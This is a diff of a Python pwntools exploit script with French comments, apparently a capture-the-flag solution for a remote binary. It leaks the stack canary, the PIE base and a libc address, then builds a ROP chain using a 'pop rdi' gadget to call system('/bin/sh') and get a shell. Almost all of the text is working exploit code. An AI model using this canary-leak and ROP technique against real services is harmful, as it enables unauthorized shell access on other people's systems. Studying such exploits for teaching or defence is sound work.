@@ -146,7 +146,6 @@ p=remote(host,port)
 def test(s):
     print "s=",s
     print "accueil ->",
-#    p.recvuntil("put?")
     p.sendline("5000")
     time.sleep(TIME)
     p.sendline(s)
@@ -156,21 +155,16 @@ def test(s):
     print "*************"
     return(b)
 
-'''
-print sp
-h=trie(sp)
-print h[0]
-for i in range(6):
-    print "->",h[1][i]
-'''
+# gadget
 poprdi=0x0000000000001243 # : pop rdi ; ret
 
 print test("glopglop")
-#
+
+# fuite canari et libc
 fuite=1024+128
 leak="a\x00"+"b"*fuite
 b=test(leak)
-print b
+# print b
 b=b[1024:]
 b=b+"\x00"*(8-(len(b)%8))
 dumpg(0,b)
@@ -180,11 +174,13 @@ pie=bword(b[16:24])-0x11e0
 print "canari=",hex(canari)
 print "pie=",hex(pie)
 print "fuite libc=",hex(bword(b[24:32]))
+
 reference_libc='__libc_start_main'
 adr_reference_libc=bword(b[24:32])-241
 adr_reference_libc=(adr_reference_libc & 0xffffffffffffff00) + (libc.sym[reference_libc] & 0xff)
 whatis('system')
 
+# mis en placce du ROP 
 mor=0
 decalage="a"*mor+ "}"*(2048-2-0x5b-mor)
 payload = decalage+p64(canari)+p64(0xcafebabe)+p64(pie+poprdi)+p64(adlibc(libc.data.index("/bin/sh\x00")))+p64(tolibc('system'))
